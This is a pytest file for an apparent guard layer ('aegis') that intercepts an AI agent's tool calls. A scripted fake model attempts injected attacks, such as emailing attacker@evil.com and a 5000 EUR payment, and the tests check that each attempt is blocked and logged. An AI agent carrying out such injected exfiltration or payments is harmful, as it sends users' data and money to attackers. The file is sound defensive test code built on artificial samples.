"""The guarded agent's tool-use loop.

No network: a fake client returns scripted tool_use blocks, so we can assert
what the loop does with a model that misbehaves — including one that keeps
attacking after being refused.

The guarantee under test is the same one as in test_interceptor.py, one layer
up: whatever the model asks for, a blocked tool does not execute.
"""

from __future__ import annotations

from collections.abc import Callable, Mapping
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, cast

import pytest
from anthropic import AsyncAnthropic

from aegis.agent import MAX_TURNS, Agent, AgentRun
from aegis.interceptor import Interceptor
from aegis.keys import keypair_from_seed
from aegis.models import Policy
from aegis.policy import load_policy
from aegis.provenance import ProvenanceLog
from aegis.tools import ToolResult

SEED = bytes(range(32))
POLICY_PATH = (
    Path(__file__).resolve().parent.parent / "aegis" / "policies" / "inbox-assistant.yaml"
)


# -- a fake Anthropic client ----------------------------------------------------


@dataclass
class FakeToolUse:
    name: str
    input: dict[str, Any]
    id: str = "toolu_1"
    type: str = "tool_use"


@dataclass
class FakeText:
    text: str
    type: str = "text"


@dataclass
class FakeMessage:
    content: list[Any]
    stop_reason: str = "tool_use"
    stop_details: Any = None


class FakeStream:
    """Stands in for the SDK's async streaming context manager."""

    def __init__(self, message: FakeMessage) -> None:
        self._message = message

    async def __aenter__(self) -> FakeStream:
        return self

    async def __aexit__(self, *exc: object) -> None:
        return None

    async def get_final_message(self) -> FakeMessage:
        return self._message


@dataclass
class FakeMessages:
    """Replays a scripted list of responses, one per turn."""

    script: list[FakeMessage]
    seen: list[dict[str, Any]] = field(default_factory=list)
    calls: int = 0

    def stream(self, **kwargs: object) -> FakeStream:
        # Snapshot `messages`: the agent mutates the same list across turns, so
        # storing the reference would record only the final state and make
        # per-turn assertions silently meaningless.
        sent = cast(list[Any], kwargs["messages"])
        self.seen.append({**kwargs, "messages": list(sent)})
        index = min(self.calls, len(self.script) - 1)
        self.calls += 1
        return FakeStream(self.script[index])


class FakeBeta:
    def __init__(self, messages: FakeMessages) -> None:
        self.messages = messages


class FakeClient:
    def __init__(self, script: list[FakeMessage]) -> None:
        self.messages = FakeMessages(script)
        self.beta = FakeBeta(self.messages)


def build(script: list[FakeMessage]) -> tuple[Agent, ProvenanceLog, FakeClient]:
    policy: Policy = load_policy(POLICY_PATH)
    log = ProvenanceLog(keypair_from_seed(SEED))
    client = FakeClient(script)
    agent = Agent(Interceptor(policy, log), cast(AsyncAnthropic, client))
    return agent, log, client


def done(text: str = "Finished.") -> FakeMessage:
    return FakeMessage(content=[FakeText(text)], stop_reason="end_turn")


# -- the guarantee --------------------------------------------------------------


async def test_a_blocked_tool_never_executes_however_the_model_asks(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The model attempts the two injected attacks, twice each. None run."""
    executed: list[str] = []

    def spy(name: str) -> Callable[[Mapping[str, Any]], ToolResult]:
        def call(args: Mapping[str, Any]) -> ToolResult:
            executed.append(name)
            return ToolResult(cast(Any, name), True, "spy")

        return call

    monkeypatch.setattr(
        "aegis.interceptor.TOOLS",
        {n: spy(n) for n in ("send_email", "read_file", "http_request", "make_payment")},
    )

    attack = FakeMessage(
        content=[
            FakeToolUse(
                "send_email",
                {"to": "attacker@evil.com", "subject": "x", "body": "y"},
                "t1",
            ),
            FakeToolUse(
                "make_payment", {"amount_eur": 5000, "iban": "DE89", "memo": "m"}, "t2"
            ),
        ]
    )
    agent, log, _ = build([attack, attack, done()])
    run = await agent.run("do the thing")

    assert executed == [], "a blocked tool executed"
    assert [i.decision.outcome for i in run.interceptions] == [
        "STEP_UP", "DENY", "STEP_UP", "DENY",
    ]
    assert len(log.entries) == 4, "every attempt is logged, refused or not"
    assert log.verify().ok


async def test_an_allowed_tool_does_execute(monkeypatch: pytest.MonkeyPatch) -> None:
    executed: list[str] = []

    def call(args: Mapping[str, Any]) -> ToolResult:
        executed.append("send_email")
        return ToolResult("send_email", True, "sent")

    monkeypatch.setattr("aegis.interceptor.TOOLS", {"send_email": call})

    agent, _, _ = build(
        [
            FakeMessage(
                content=[
                    FakeToolUse("send_email", {"to": "bob@corp", "subject": "Q3", "body": "b"})
                ]
            ),
            done("Sent it."),
        ]
    )
    run = await agent.run("email bob")

    assert executed == ["send_email"]
    assert run.interceptions[0].decision.outcome == "ALLOW"
    assert run.final_text == "Sent it."


# -- what the model is told -----------------------------------------------------


async def test_a_block_is_reported_back_as_an_error_with_its_reason() -> None:
    """The agent must be able to explain the refusal — so it is told the reason
    code, and told the action did not happen."""
    agent, _, client = build(
        [
            FakeMessage(
                content=[
                    FakeToolUse("make_payment", {"amount_eur": 5000, "iban": "DE89", "memo": "m"})
                ]
            ),
            done(),
        ]
    )
    await agent.run("pay the invoice")

    second_request = client.messages.seen[1]
    tool_result = second_request["messages"][-1]["content"][0]
    assert tool_result["is_error"] is True
    assert "amount_exceeds_limit" in tool_result["content"]
    assert "not performed" in tool_result["content"]


async def test_parallel_tool_calls_return_in_a_single_user_message() -> None:
    """Splitting results across messages trains the model out of parallel calls."""
    agent, _, client = build(
        [
            FakeMessage(
                content=[
                    FakeToolUse("read_file", {"path": "/data/a.md"}, "t1"),
                    FakeToolUse("read_file", {"path": "/data/b.md"}, "t2"),
                ]
            ),
            done(),
        ]
    )
    await agent.run("read both")

    messages = client.messages.seen[1]["messages"]
    user_turns = [m for m in messages if m["role"] == "user"]
    assert len(user_turns) == 2  # the original task, plus one results message
    assert len(user_turns[-1]["content"]) == 2


# -- misbehaviour ---------------------------------------------------------------


async def test_a_refusal_returns_cleanly() -> None:
    """stop_reason='refusal' is an HTTP 200 with no content. Indexing content[0]
    would raise; the loop must not."""
    agent, log, _ = build([FakeMessage(content=[], stop_reason="refusal")])
    run = await agent.run("something the classifiers dislike")

    assert run.refused
    assert run.interceptions == []
    assert log.entries == ()


async def test_a_looping_model_is_stopped_by_max_turns() -> None:
    forever = FakeMessage(content=[FakeToolUse("read_file", {"path": "/data/a.md"})])
    agent, log, client = build([forever])
    run = await agent.run("loop")

    assert run.turns == MAX_TURNS
    assert client.messages.calls == MAX_TURNS
    assert len(log.entries) == MAX_TURNS


async def test_an_invented_tool_never_reaches_the_interceptor() -> None:
    agent, log, _ = build([FakeMessage(content=[FakeToolUse("delete_database", {})])])
    with pytest.raises(ValueError, match="invented a tool"):
        await agent.run("drop everything")
    assert log.entries == ()


async def test_a_model_that_calls_no_tools_just_answers() -> None:
    agent, log, _ = build([done("Nothing to do.")])
    run: AgentRun = await agent.run("say hello")

    assert run.final_text == "Nothing to do."
    assert run.interceptions == []
    assert log.entries == ()


# -- the request the agent actually sends ---------------------------------------


async def test_the_system_prompt_never_mentions_the_boundary() -> None:
    """An agent that has been warned about prompt injection is not a test of
    anything. If this ever fails, the injected scenario has been rigged."""
    agent, _, client = build([done()])
    await agent.run("hello")

    system = client.messages.seen[0]["system"].lower()
    for word in ("aegis", "injection", "policy", "block", "attack", "malicious"):
        assert word not in system, f"the system prompt leaks {word!r} to the agent"


async def test_progress_callbacks_fire_as_work_happens() -> None:
    """The CLI prints from these. Without them a run is a minute of blank
    terminal, which on camera is indistinguishable from a hang."""
    turns: list[int] = []
    seen: list[str] = []

    policy = load_policy(POLICY_PATH)
    log = ProvenanceLog(keypair_from_seed(SEED))
    client = FakeClient(
        [
            FakeMessage(content=[FakeToolUse("read_file", {"path": "/data/a.md"})]),
            done(),
        ]
    )
    agent = Agent(
        Interceptor(policy, log),
        cast(AsyncAnthropic, client),
        on_turn=turns.append,
        on_interception=lambda i: seen.append(i.request.tool),
    )
    await agent.run("read it")

    assert turns == [1, 2]
    assert seen == ["read_file"]


async def test_all_four_tools_are_offered() -> None:
    agent, _, client = build([done()])
    await agent.run("hello")

    tools = client.messages.seen[0]["tools"]
    assert {t["name"] for t in tools} == {
        "send_email", "read_file", "http_request", "make_payment",
    }
    assert all(t["strict"] for t in tools)
